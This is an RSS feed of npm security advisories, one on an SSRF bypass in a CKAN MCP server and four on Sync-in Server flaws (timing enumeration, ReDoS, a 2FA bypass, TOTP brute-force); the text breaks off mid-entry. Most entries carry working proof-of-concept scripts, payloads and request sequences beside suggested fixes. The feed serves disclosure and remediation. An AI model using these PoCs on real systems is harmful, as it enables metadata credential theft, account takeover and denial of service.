<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-22T15:13:49.914Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@aborruso/ckan-mcp-server] @aborruso/ckan-mcp-server has SSRF via DNS-name → internal IP — incomplete fix of CVE-2026-53509]]></title>
        <id>https://github.com/advisories/GHSA-798p-78g2-v556</id>
        <link href="https://github.com/advisories/GHSA-798p-78g2-v556"/>
        <updated>2026-09-22T14:51:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The SSRF guard <code>validateServerUrl</code> (added for CVE-2026-33060, extended for CVE-2026-53509) validates only the <strong>hostname string</strong> and never resolves DNS. Any caller-supplied <code>server_url</code> whose hostname <em>resolves</em> to an internal address passes the guard, so the server issues requests to <strong>loopback and cloud metadata (<code>169.254.169.254</code>)</strong>. This is a third bypass of the same guard, still present in the current latest <strong>0.4.107</strong>, and it reaches IMDS — strictly more than CVE-2026-53509, which only reached loopback.</p>
<h2 id="affected--patched">Affected / patched</h2>
<ul>
<li><code>@aborruso/ckan-mcp-server</code> (npm) — all versions with the guard, through <strong>0.4.107</strong> (current <code>latest</code>). The guard has never resolved DNS. No patch yet.</li>
</ul>
<h2 id="severity">Severity</h2>
<p>It is effectively <strong>High</strong> for the self-hosted <strong>unauthenticated HTTP transport</strong> (<code>TRANSPORT=http</code>, <code>POST /mcp</code>), where any remote client reaches IMDS/internal hosts directly. The official Cloudflare Worker endpoint is CF-sandboxed (cannot reach loopback/RFC-1918/IMDS).</p>
<h2 id="root-cause--srcutilshttpts-validateserverurl">Root cause — <code>src/utils/http.ts</code>, <code>validateServerUrl</code></h2>
<p>The guard blocks IP <strong>literals</strong> and three loopback alias strings, but does no name resolution:</p>
<pre><code class="language-ts">const hostname = parsed.hostname.toLowerCase();
if (new Set(['localhost','ip6-localhost','ip6-loopback']).has(hostname)) throw;   // string denylist
if (hostname.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/)) { /* block private/special IPv4 LITERALS */ }
// no DNS resolution → a hostname that RESOLVES to 127.0.0.1 / 169.254.169.254 / 10.x is allowed
</code></pre>
<p>Both prior fixes only added literal strings to the denylist (CVE-2026-33060 added the guard; CVE-2026-53509 added <code>ip6-localhost</code>/<code>ip6-loopback</code>). The DNS-resolution gap — the actual root cause — remains. <code>server_url</code> is a caller-controlled argument (<code>z.string().url()</code>) on every tool, reaching <code>makeCkanRequest</code> (all CKAN tools) and <code>querySparqlEndpoint</code> (<code>sparql_query</code>). The sink is <strong>non-blind</strong>: a non-CKAN response is returned to the caller verbatim via <code>CKAN API returned success=false: &lt;body&gt;</code>.</p>
<blockquote>
<p>Note: numeric-IP encodings (decimal <code>2130706433</code>, short <code>127.1</code>, hex <code>0x7f.0.0.1</code>) do <strong>not</strong> bypass — Node's WHATWG <code>new URL()</code> canonicalizes them to dotted-decimal before the regex. Only the DNS-name vector bypasses.</p>
</blockquote>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Drives the published server over the MCP protocol via the public <code>ckan_package_search</code> tool. Local-only: the loopback server stands in for an internal/IMDS endpoint.</p>
<pre><code class="language-sh">npm install @aborruso/ckan-mcp-server@0.4.107 @modelcontextprotocol/sdk
node poc.mjs
</code></pre>
<pre><code class="language-js">import http from 'node:http';
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const SECRET = 'INTERNAL-ONLY-IAM-CREDENTIALS-AKIAEXAMPLE';
const internal = http.createServer((_req, res) =&gt; {
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ Token: SECRET }));                 // stand-in for an IMDS / internal response
});
await new Promise(r =&gt; internal.listen(0, '127.0.0.1', r));
const port = internal.address().port;

const client = new Client({ name: "ssrf-poc", version: "1.0.0" });
await client.connect(new StdioClientTransport({
  command: "node", args: ["node_modules/@aborruso/ckan-mcp-server/dist/index.js"]
}));

// nip.io is public wildcard DNS: &lt;ip&gt;.nip.io -&gt; &lt;ip&gt;. The guard sees hostname "127.0.0.1.nip.io"
// (not a literal, not in its denylist) and allows it; the request resolves to 127.0.0.1.
// Use 169.254.169.254.nip.io to reach IMDS on a cloud host.
const evil = `http://127.0.0.1.nip.io:${port}/`;
const res = await client.callTool({ name: "ckan_package_search", arguments: { server_url: evil, q: "x" } });

const text = res.content?.[0]?.text || JSON.stringify(res);
console.log("SSRF:", text.includes(SECRET) ? "YES — internal server reached, body returned to caller" : "no");
console.log(text.slice(0, 220));
await client.close(); internal.close();
</code></pre>
<p>Output:</p>
<pre><code>SSRF: YES — internal server reached, body returned to caller
CKAN API returned success=false: {"Token":"INTERNAL-ONLY-IAM-CREDENTIALS-AKIAEXAMPLE"}
</code></pre>
<p>A real attacker uses any domain with an A/AAAA record pointing at an internal IP, or DNS rebinding; <code>nip.io</code> just makes the PoC self-contained.</p>
<h2 id="impact">Impact</h2>
<p>Caller-controlled SSRF to loopback, RFC-1918 hosts, and <code>169.254.169.254</code> (cloud IMDS → IAM credentials), with the response body returned to the caller (non-blind). In the default stdio deployment this requires prompt injection to steer the tool argument; the self-hosted HTTP transport is unauthenticated, so any remote client can trigger it directly.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Resolve the hostname and validate <strong>every resolved IP</strong> against the private/special ranges, then <strong>pin the connection to the validated IP</strong> (custom <code>lookup</code>/agent) so a re-resolve cannot rebind to an internal address — or require the existing <code>CKAN_ALLOWED_DOMAINS</code> allowlist (default-deny, especially for the HTTP transport). A hostname-string denylist cannot close this class.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ondata/ckan-mcp-server/security/advisories/GHSA-798p-78g2-v556">https://github.com/ondata/ckan-mcp-server/security/advisories/GHSA-798p-78g2-v556</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61612">https://nvd.nist.gov/vuln/detail/CVE-2026-61612</a></li>
<li><a href="https://github.com/ondata/ckan-mcp-server/commit/bb7439b553b9f965adc3d43bcd415c42eebe2f40">https://github.com/ondata/ckan-mcp-server/commit/bb7439b553b9f965adc3d43bcd415c42eebe2f40</a></li>
<li><a href="https://github.com/advisories/GHSA-3xm7-qw7j-qc8v">https://github.com/advisories/GHSA-3xm7-qw7j-qc8v</a></li>
<li><a href="https://github.com/advisories/GHSA-g84h-j7jj-x32p">https://github.com/advisories/GHSA-g84h-j7jj-x32p</a></li>
<li><a href="https://github.com/ondata/ckan-mcp-server/releases/tag/v0.4.108">https://github.com/ondata/ckan-mcp-server/releases/tag/v0.4.108</a></li>
<li><a href="https://github.com/advisories/GHSA-798p-78g2-v556">https://github.com/advisories/GHSA-798p-78g2-v556</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-798p-78g2-v556</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-22T14:51:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sync-in/server] Sync-in Server has Username/Login Enumeration via Timing Side-Channel on POST /api/auth/login (incomplete fix of the prior timing-attack advisory)]]></title>
        <id>https://github.com/advisories/GHSA-29hq-23m2-2j47</id>
        <link href="https://github.com/advisories/GHSA-29hq-23m2-2j47"/>
        <updated>2026-09-22T14:49:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>validateUser() in backend/src/authentication/providers/mysql/auth-provider-mysql.service.ts returns immediately when the supplied login/email does not match any account, without ever calling comparePassword():</p>
<pre><code>async validateUser(loginOrEmail: string, password: string, ip?: string, scope?: AUTH_SCOPE): Promise&lt;UserModel&gt; {
  let user: UserModel
  try {
    user = await this.usersManager.findUser(loginOrEmail, false)
  } catch (e) { ... }
  if (!user) {
    this.logger.warn(...)
    return null   // &lt;-- comparePassword() is never reached here
  }
  return await this.usersManager.logUser(user, password, ip, scope)
}
</code></pre>
<p>comparePassword() (backend/src/common/functions.ts) already contains a dummy-hash branch that was clearly added to defend against exactly this class of attack:</p>
<pre><code>export async function comparePassword(password: string, hash?: string | null): Promise&lt;boolean&gt; {
  if (!hash) {
    // No hash, waste time for time-based attacks
    await bcrypt.compare(password, DUMMY_PASSWORD_HASH)
    return false
  }
  return await bcrypt.compare(password, hash)
}
</code></pre>
<p>The problem is that this protection only runs when comparePassword() is actually invoked with a falsy hash. Because validateUser() short-circuits with return null as soon as findUser() comes back empty, the "account doesn't exist" path skips all cryptographic work entirely, while the "account exists, wrong password" path always performs a real bcrypt comparison (cost factor 10, ~100ms+). The two outcomes are trivially distinguishable by response time.</p>
<p>There's already a published advisory in this repo for "Username Enumeration via Timing Attack" - this looks like the same underlying issue surfacing through a different call path (the early return in validateUser()) that the existing fix (the dummy-hash branch in comparePassword()) doesn't actually reach, rather than a brand new vulnerability class.</p>
<h2 id="impact">Impact</h2>
<p>Any unauthenticated client can determine whether a given username/email is a valid account on the instance by timing POST /api/auth/login:</p>
<ul>
<li>Non-existent login: near-instant rejection (no bcrypt call).</li>
<li>Existing login (regardless of password correctness): consistently slower due to a real bcrypt comparison.</li>
</ul>
<p>This enables efficient enumeration of valid accounts, which can then be used to focus credential-stuffing, password-spraying, or phishing against confirmed-valid targets.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Verified with the actual comparePassword() logic and the real DUMMY_PASSWORD_HASH constant copied verbatim from backend/src/common/functions.ts, using the project's own bcryptjs dependency (no mocking of bcrypt itself):</p>
<pre><code>Avg time for "login does not exist" path (validateUser returns null, no bcrypt call): 0.00 ms
Avg time for "login exists, wrong password" path (real bcrypt.compare runs):          114.90 ms
Difference: 114.90 ms (ratio: ~58923x)
</code></pre>
<p>The "not found" path reproduces validateUser()'s exact early return (no call into comparePassword); the "wrong password" path reproduces logUser()'s real call into comparePassword(password, user.password). The gap is large enough to be trivially observable over a real network, even accounting for jitter.</p>
<p>Reachable endpoint: POST /api/auth/login, guarded only by AuthLocalGuard (Passport local strategy invoking validateUser()), no authentication required.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Make validateUser() always pass through comparePassword()'s timing-equalized path, even when no user is found, e.g.:</p>
<pre><code>if (!user) {
  await comparePassword(password, null) // burns the same time as a real comparison
  return null
}
</code></pre>
<p>so the "account not found" and "account found, wrong password" branches take statistically indistinguishable time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Sync-in/server/security/advisories/GHSA-29hq-23m2-2j47">https://github.com/Sync-in/server/security/advisories/GHSA-29hq-23m2-2j47</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58272">https://nvd.nist.gov/vuln/detail/CVE-2026-58272</a></li>
<li><a href="https://github.com/Sync-in/server/commit/b80efe04574039a7a302c0e1007f03a7dbe6a633">https://github.com/Sync-in/server/commit/b80efe04574039a7a302c0e1007f03a7dbe6a633</a></li>
<li><a href="https://github.com/Sync-in/server/releases/tag/v2.4.1">https://github.com/Sync-in/server/releases/tag/v2.4.1</a></li>
<li><a href="https://github.com/advisories/GHSA-29hq-23m2-2j47">https://github.com/advisories/GHSA-29hq-23m2-2j47</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29hq-23m2-2j47</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-22T14:49:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sync-in/server] Sync-in Server has a ReDoS via Unsanitized Regex in Sync Diff `pathFilters`]]></title>
        <id>https://github.com/advisories/GHSA-jx63-h26r-8cph</id>
        <link href="https://github.com/advisories/GHSA-jx63-h26r-8cph"/>
        <updated>2026-09-22T14:47:57.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Affected component:</strong> Sync-in Server v2.3.0, <code>POST /api/app/sync/operation/diff/:id</code>, vulnerable implementation of <code>pathFilters</code> in <code>backend/src/applications/sync/dtos/sync-operations.dto.ts</code>.</p>
<h2 id="summary">Summary</h2>
<p>In the vulnerable version, the sync diff endpoint accepted a user-controlled regex pattern through <code>pathFilters</code> and compiled it into a <code>RegExp</code> without complexity validation. The resulting regex was then executed synchronously against relative file paths during diff generation.</p>
<p>A catastrophic-backtracking pattern, such as <code>^(a+)+b</code>, can block the affected Node.js event loop when evaluated against a worst-case path shape. In a single-process deployment, this can make the server unavailable to other users while the regex evaluation is running. Repeated malicious requests can sustain the denial of service.</p>
<h2 id="details">Details</h2>
<p><code>SyncDiffDto</code> transformed user input directly into a <code>RegExp</code> without validating regex complexity:</p>
<pre><code class="language-typescript">// backend/src/applications/sync/dtos/sync-operations.dto.ts
@IsOptional()
@Transform(({ value }) =&gt; (typeof value === 'string' &amp;&amp; value.length &gt; 0 ? new RegExp(value, 'i') : null))
pathFilters?: RegExp = null
</code></pre>
<p>The compiled regex was then executed synchronously during sync diff traversal:</p>
<pre><code class="language-typescript">// backend/src/applications/sync/services/sync-manager.service.ts
if (ctx.syncDiff.pathFilters &amp;&amp; ctx.syncDiff.pathFilters.test(filePath)) {
</code></pre>
<p>Because <code>.test()</code> is synchronous, a catastrophic-backtracking pattern can block the Node.js event loop for the duration of the regex evaluation.</p>
<p>The impact depends on the file paths being tested. For example, the pattern <code>^(a+)+b</code> is most effective when the sync tree contains a relative path beginning with a long sequence of <code>a</code> characters and not followed by <code>b</code>.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> Valid non-guest account, a registered sync client, and a sync path containing at least one file or directory whose relative path triggers catastrophic backtracking for the supplied pattern.</p>
<p>For the payload <code>^(a+)+b</code>, an effective test case is a path containing a long name made of repeated <code>a</code> characters.</p>
<p><strong>Steps:</strong></p>
<ol>
<li>Register a sync client: <code>POST /api/app/sync/register</code> with credentials and <code>clientId</code>.</li>
<li>Authenticate: <code>POST /api/app/sync/auth/cookie</code> to get a JWT with <code>clientId</code> embedded.</li>
<li>Create or use a sync path targeting an application-managed directory containing files.</li>
<li>Ensure the sync path contains a worst-case filename or directory name for the regex, for example a long sequence of <code>a</code> characters.</li>
<li>Send a diff request with the ReDoS pattern:</li>
</ol>
<pre><code class="language-http">POST /api/app/sync/operation/diff/1
Content-Type: application/json
sync-in-csrf: &lt;csrf-token&gt;
Cookie: sync-in-access=&lt;jwt&gt;

{"secureDiff":false,"firstSync":true,"defaultFilters":[],"pathFilters":"^(a+)+b","snapshot":{}}
</code></pre>
<p><strong>Evidence from live test on Sync-in Server v2.3.0, Node.js v24.16.0:</strong></p>
<pre><code class="language-text">[+] Baseline (no pathFilters): 0.019s, 15 files
[*] Sending ReDoS pattern: ^(a+)+b
[!] TIMEOUT after 20.022s - ReDoS CONFIRMED

# Server state during ReDoS:
$ docker stats sync-in --no-stream
CONTAINER   CPU %     MEM USAGE
sync-in     398.82%   745.2MiB / 7.709GiB

# Other endpoints did not respond during the timeout window:
$ curl -m 5 http://target:8080/
(exit code 28 - connection timeout)
</code></pre>
<p>The container-level CPU spike indicates severe resource saturation while the endpoint was unresponsive. The request timeout demonstrates event-loop blocking during the observed window, but does not by itself prove permanent failure after the malicious request stops.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated user with desktop sync access can submit a malicious <code>pathFilters</code> regex that blocks the affected Node.js event loop during sync diff generation.</p>
<p>In a single-process deployment, this can prevent other HTTP requests, including health checks, from receiving responses while the regex evaluation is running. Repeated malicious requests can keep the service unavailable and may require administrative intervention.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate <code>pathFilters</code> before using the resulting regex during diff traversal.</p>
<p>Recommended controls:</p>
<ul>
<li>Reject empty or non-string values.</li>
<li>Enforce a maximum regex pattern length.</li>
<li>Reject invalid regex syntax.</li>
<li>Reject unsafe regex patterns using <code>safe-regex2</code> or an equivalent safety checker.</li>
<li>Return a <code>BadRequestException</code> for invalid or unsafe patterns.</li>
</ul>
<p>Example remediation:</p>
<pre><code class="language-typescript">@IsOptional()
@Transform(({ value }) =&gt; {
  if (typeof value !== 'string' || value.length === 0) return null

  if (value.length &gt; MAX_PATH_FILTER_PATTERN_LENGTH) {
    throw new BadRequestException('Path filter pattern is too long')
  }

  let pathFilter: RegExp
  try {
    pathFilter = new RegExp(value, 'i')
  } catch {
    throw new BadRequestException('Invalid path filter pattern')
  }

  if (!isSafePattern(pathFilter)) {
    throw new BadRequestException('Unsafe path filter pattern')
  }

  return pathFilter
})
pathFilters?: RegExp = null
</code></pre>
<p>Where <code>isSafePattern</code> uses <code>safe-regex2</code> or equivalent to reject patterns likely to cause catastrophic backtracking, including nested quantifier patterns such as <code>^(a+)+b</code>.</p>
<p>A regression test should assert that <code>^(a+)+b</code> is rejected before the regex is used against file paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Sync-in/server/security/advisories/GHSA-jx63-h26r-8cph">https://github.com/Sync-in/server/security/advisories/GHSA-jx63-h26r-8cph</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58270">https://nvd.nist.gov/vuln/detail/CVE-2026-58270</a></li>
<li><a href="https://github.com/Sync-in/server/pull/228">https://github.com/Sync-in/server/pull/228</a></li>
<li><a href="https://github.com/Sync-in/server/commit/b1dcaa1d1c1bb17ab6c31a404cc9cead7efdd979">https://github.com/Sync-in/server/commit/b1dcaa1d1c1bb17ab6c31a404cc9cead7efdd979</a></li>
<li><a href="https://github.com/Sync-in/server/releases/tag/v2.4.0">https://github.com/Sync-in/server/releases/tag/v2.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-jx63-h26r-8cph">https://github.com/advisories/GHSA-jx63-h26r-8cph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jx63-h26r-8cph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-22T14:47:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sync-in/server] Sync-in Server has a complete 2FA Bypass via `POST /api/auth/token`]]></title>
        <id>https://github.com/advisories/GHSA-92cr-jxw4-5wjg</id>
        <link href="https://github.com/advisories/GHSA-92cr-jxw4-5wjg"/>
        <updated>2026-09-22T14:46:32.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Affected component:</strong> Sync-in Server v2.3.0, <code>POST /api/auth/token</code> (<code>auth.controller.ts:50-55</code>).</p>
<p><strong>Required attacker capability:</strong> Valid username and password for a 2FA-enabled account.</p>
<h2 id="summary">Summary</h2>
<p><code>POST /api/auth/token</code> authenticates with username and password only, then calls <code>getTokens()</code>, which returns unrestricted Bearer access and refresh JWTs without checking whether the account has TOTP 2FA enabled. An attacker who already knows valid credentials for a 2FA-enabled account can bypass 2FA in a single request.</p>
<p>The parallel login endpoint (<code>POST /api/auth/login</code>) correctly enforces 2FA by calling <code>setCookies(user, res, true)</code>, which gates on <code>user.twoFaEnabled</code> when server-side TOTP is enabled.</p>
<h2 id="details">Details</h2>
<p>The token endpoint at <code>auth.controller.ts:50-55</code> uses <code>AuthLocalGuard</code> (password-only) and calls <code>getTokens()</code> directly:</p>
<pre><code class="language-typescript">// auth.controller.ts:50-55
@Post(AUTH_ROUTE.TOKEN)
@AuthTokenSkip()
@UseGuards(AuthLocalGuard)
token(@GetUser() user: UserModel): Promise&lt;TokenResponseDto&gt; {
  return this.authManager.getTokens(user)
}
</code></pre>
<p><code>getTokens()</code> at <code>auth.service.ts:25-39</code> signs and returns access and refresh JWTs. It never reads <code>user.twoFaEnabled</code>:</p>
<pre><code class="language-typescript">// auth.service.ts:25-39
async getTokens(user: UserModel, refresh = false): Promise&lt;TokenResponseDto&gt; {
  const currentTime = currentTimeStamp()
  // ...expiration logic...
  return {
    [TOKEN_TYPE.ACCESS]: await this.jwtSign(user, TOKEN_TYPE.ACCESS, accessExpiration),
    [TOKEN_TYPE.REFRESH]: await this.jwtSign(user, TOKEN_TYPE.REFRESH, refreshExpiration),
    // ...
  }
}
</code></pre>
<p>Compare with the login endpoint at <code>auth.controller.ts:30-35</code>, which calls <code>setCookies(user, res, true)</code>. Inside <code>setCookies()</code> at <code>auth.service.ts:45</code>, the 2FA gate fires:</p>
<pre><code class="language-typescript">// auth.service.ts:45
const verify2Fa = init2FaVerify &amp;&amp; configuration.auth.mfa.totp.enabled &amp;&amp; user.twoFaEnabled
</code></pre>
<p>When <code>verify2Fa</code> is true, <code>setCookies()</code> issues only a restricted <code>ACCESS_2FA</code> token and requires the user to complete <code>POST /api/auth/2fa/login/verify</code> before receiving full session cookies. The token endpoint has no equivalent gate.</p>
<h2 id="poc">PoC</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>A Sync-in instance with TOTP 2FA enabled server-wide.</li>
<li>A user account with 2FA enrolled (the target).</li>
<li>The target's valid login and password, but not the TOTP secret or current TOTP code.</li>
</ul>
<h3 id="steps">Steps</h3>
<ol>
<li><p><strong>Enable 2FA on the target account.</strong> Log in as the target user, navigate to Settings, and enable TOTP two-factor authentication.</p>
</li>
<li><p><strong>Confirm normal login requires 2FA.</strong> Log out. Log back in with the target's credentials. The UI presents a TOTP code prompt before granting access, and the API response contains only <code>token.access_2fa_expiration</code> (a restricted partial token):</p>
</li>
</ol>
<pre><code>POST /api/auth/login
{"login":"test","password":"..."}

Response: {"user":{"twoFaEnabled":true},"server":{"twoFaEnabled":true},"token":{"access_2fa_expiration":1781234379}}
</code></pre>
<ol start="3">
<li><strong>Bypass 2FA via the token endpoint.</strong> Send the same credentials to <code>/api/auth/token</code>:</li>
</ol>
<pre><code>POST /api/auth/token
{"login":"test","password":"..."}

Response:
{
  "access": "eyJhbGciOiJIUzI1NiIs...",
  "refresh": "eyJhbGciOiJIUzI1NiIs...",
  "access_expiration": 1781235890,
  "refresh_expiration": 1781248490
}
</code></pre>
<p>Unrestricted Bearer access and refresh JWTs are returned. No TOTP code was required.</p>
<ol start="4">
<li><strong>Confirm API access.</strong> Use the token on a protected endpoint:</li>
</ol>
<pre><code>GET /api/users/me
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

Response: {"user":{"id":16,"login":"test","email":"test@lab.local","twoFaEnabled":true,...}}
</code></pre>
<p>The server returns the user profile. Protected API endpoints that accept Bearer authentication are accessible as the target user. No TOTP code was required at any step.</p>
<h3 id="measured-observations">Measured observations</h3>
<ul>
<li>The login endpoint (<code>/api/auth/login</code>) correctly returns a restricted 2FA-pending response.</li>
<li>The token endpoint (<code>/api/auth/token</code>) returns unrestricted Bearer JWTs with the same credentials and no TOTP.</li>
<li>The returned Bearer token grants access to protected API endpoints as a fully authenticated user, though cookie-specific flows may differ.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An attacker who already knows valid credentials for a 2FA-enabled account can obtain unrestricted Bearer access and refresh JWTs in a single HTTP request, without knowing the TOTP secret or possessing the authenticator device. 2FA security is bypassed for Bearer-token API authentication.</p>
<h2 id="remediation">Remediation</h2>
<p>Gate the token endpoint behind the same 2FA policy used by the login route. After <code>AuthLocalGuard</code> validates the username and password, require a valid TOTP code when server-side TOTP is enabled and <code>user.twoFaEnabled</code> is true, before calling <code>getTokens()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Sync-in/server/security/advisories/GHSA-92cr-jxw4-5wjg">https://github.com/Sync-in/server/security/advisories/GHSA-92cr-jxw4-5wjg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58269">https://nvd.nist.gov/vuln/detail/CVE-2026-58269</a></li>
<li><a href="https://github.com/Sync-in/server/pull/228">https://github.com/Sync-in/server/pull/228</a></li>
<li><a href="https://github.com/Sync-in/server/commit/3ec74e2ea1f538fe1a3ac9487bdf24a19e548361">https://github.com/Sync-in/server/commit/3ec74e2ea1f538fe1a3ac9487bdf24a19e548361</a></li>
<li><a href="https://github.com/Sync-in/server/releases/tag/v2.4.0">https://github.com/Sync-in/server/releases/tag/v2.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-92cr-jxw4-5wjg">https://github.com/advisories/GHSA-92cr-jxw4-5wjg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92cr-jxw4-5wjg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-22T14:46:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sync-in/server] @sync-in/server vulnerable to TOTP Brute-Force via `POST /api/app/sync/register`]]></title>
        <id>https://github.com/advisories/GHSA-274f-6w77-8qm9</id>
        <link href="https://github.com/advisories/GHSA-274f-6w77-8qm9"/>
        <updated>2026-09-22T14:44:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Affected component:</strong> Sync-in Server v2.3.0, <code>POST /api/app/sync/register</code>.</p>
<p><strong>Required attacker capability:</strong> Valid login and password for a TOTP-enabled account with desktop sync permission.</p>
<h2 id="summary">Summary</h2>
<p><code>POST /api/app/sync/register</code> accepts credentials and a TOTP code to register a desktop sync client. In the vulnerable version, on a failed TOTP attempt, <code>SyncClientsManager.register()</code> called <code>updateAccesses(user, ip, false)</code>, which hit a freeze branch that wrote <code>passwordAttempts</code> back unchanged. The counter never reached <code>USER_MAX_PASSWORD_ATTEMPTS</code> (10), so the account lockout gate never fired for repeated TOTP failures through this endpoint.</p>
<p>A successful TOTP guess registers a sync client and returns a <code>{clientId, clientToken}</code> pair, provided the account has the required desktop app permission and the registration payload is valid. The token can then be exchanged via <code>POST /api/app/sync/auth/cookie</code> for an authenticated session. While the guessed TOTP code is still valid, and because the attacker already knows the password, the attacker can also call <code>POST /api/auth/2fa/disable</code> to remove MFA.</p>
<h2 id="details">Details</h2>
<p>The endpoint is declared at <code>sync.controller.ts</code> line 71. <code>@AuthTokenSkip()</code> bypasses the bearer-token guard, so the route is reachable without any prior session:</p>
<pre><code class="language-typescript">@Post(SYNC_ROUTE.REGISTER)
@AuthTokenSkip()
register(@Body() syncClientRegistrationDto: SyncClientRegistrationDto, @Req() req: FastifyRequest): Promise&lt;SyncClientAuthRegistration&gt; {
  return this.syncClientsManager.register(syncClientRegistrationDto, req.ip)
}
</code></pre>
<p>Inside <code>SyncClientsManager.register()</code>, after both the TOTP code and the recovery code are rejected, the handler fires a fire-and-forget access update and throws (<code>sync-clients-manager.service.ts</code> line 73):</p>
<pre><code class="language-typescript">this.usersManager.updateAccesses(user, ip, false).catch((e: Error) =&gt; this.logger.error({ tag: this.register.name, msg: `${e}` }))
throw new HttpException(authCode.message, HttpStatus.UNAUTHORIZED)
</code></pre>
<p>In the vulnerable version, <code>updateAccesses()</code> at <code>users-manager.service.ts</code> line 182 defaulted <code>isAuthTwoFa</code> to <code>false</code>:</p>
<pre><code class="language-typescript">async updateAccesses(user: UserModel, ip: string, success: boolean, isAuthTwoFa = false) {
  let passwordAttempts: number
  if (!isAuthTwoFa &amp;&amp; configuration.auth.mfa.totp.enabled &amp;&amp; user.twoFaEnabled) {
    passwordAttempts = user.passwordAttempts
  } else {
    passwordAttempts = success ? 0 : Math.min(user.passwordAttempts + 1, USER_MAX_PASSWORD_ATTEMPTS)
  }
  await this.usersQueries.updateUserOrGuest(user.id, {
    ...
    passwordAttempts: passwordAttempts,
    isActive: user.isActive &amp;&amp; passwordAttempts &lt; USER_MAX_PASSWORD_ATTEMPTS
  })
}
</code></pre>
<p>When <code>register()</code> called <code>updateAccesses(user, ip, false)</code>, <code>isAuthTwoFa</code> defaulted to <code>false</code>. The condition on line 184 evaluated to <code>true</code> when TOTP was enabled site-wide and the account had it active. The <code>else</code> branch with <code>Math.min(user.passwordAttempts + 1, ...)</code> was never reached. <code>passwordAttempts</code> was written back unchanged, and the lockout gate in <code>validateUserAccess()</code> at line 89 never fired for repeated TOTP failures through this endpoint.</p>
<p>The freeze was designed for the web login flow, where a correct password at <code>POST /api/auth/login</code> produces a partial session and the counter should be preserved until <code>POST /api/auth/2fa/login/verify</code> completes. That route calls <code>authProvider2FA.verify(body, req, true)</code>, which passes <code>isAuthTwoFa=true</code> into <code>updateAccesses()</code> and correctly increments on 2FA failure. The <code>register()</code> endpoint reused <code>updateAccesses()</code> for an outright TOTP rejection while passing the default <code>isAuthTwoFa=false</code>, triggering the freeze incorrectly.</p>
<p>The same freeze also applied to <code>logUser()</code> (<code>users-manager.service.ts</code> line 69), called by both <code>POST /api/auth/login</code> and <code>POST /api/auth/token</code>. On a wrong password for a 2FA-enabled account, <code>updateAccesses(user, ip, false)</code> was called without an <code>isAuthTwoFa</code> argument, so the freeze fired and <code>passwordAttempts</code> was preserved rather than incremented.</p>
<h2 id="poc">PoC</h2>
<p>First, create a test account with TOTP MFA enabled and desktop sync permission. Then run the following:</p>
<p><a href="https://github.com/user-attachments/files/28857878/poc_totp_bruteforce.py">poc_totp_bruteforce.py</a></p>
<pre><code class="language-bash">$ python3 poc_totp_bruteforce.py --url http://192.168.16.132:8080 --user mfatest --password 'Str0ngP@ss99!' --concurrency 4 --batch 100
</code></pre>
<p>Example output:</p>
<pre><code class="language-text">[*] Target      : http://192.168.16.132:8080
[*] Account     : mfatest
[*] Concurrency : 4

[*] Step 1: Confirming credentials and 2FA status...
[+] Credentials valid, 2FA active.

